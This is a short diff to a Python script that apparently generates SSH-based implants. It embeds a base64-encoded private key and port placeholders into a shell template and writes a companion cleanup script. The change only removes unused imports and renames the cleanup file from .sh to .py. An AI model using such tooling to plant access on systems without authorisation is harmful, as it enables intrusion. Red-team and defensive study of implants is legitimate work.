@@ -4,9 +4,7 @@ import os
 import sys
 import base64
 from io import StringIO
-import gzip
 import re
-import tempfile
 import uuid
 
 logging = True
@@ -74,7 +72,7 @@ def main():
     privencoded = privstring.encode("utf-8")
     privkey = base64.b64encode(privencoded)
     implant_py = getfile(os.path.join(sys.path[0], "loadssh_template.sh"))
-    cleanup_py = getfile(os.path.join(sys.path[0],"cleanup.sh"))
+    cleanup_py = getfile(os.path.join(sys.path[0],"cleanup.py"))
     implant = templify(implant_py, {
         "PORT_PLACEHOLDER" : port,
         "REMOTE_PLACEHOLDER": remoteport,
@@ -89,7 +87,7 @@ def main():
     })
     filename = str(uuid.uuid4())
 
-    with open(KEYPATH+filename+'_cleanup.sh','w') as file2:
+    with open(KEYPATH+filename+'_cleanup.py','w') as file2:
         file2.write(implant_clean)
     with open(KEYPATH+filename,'w') as file:
         file.write(implant)
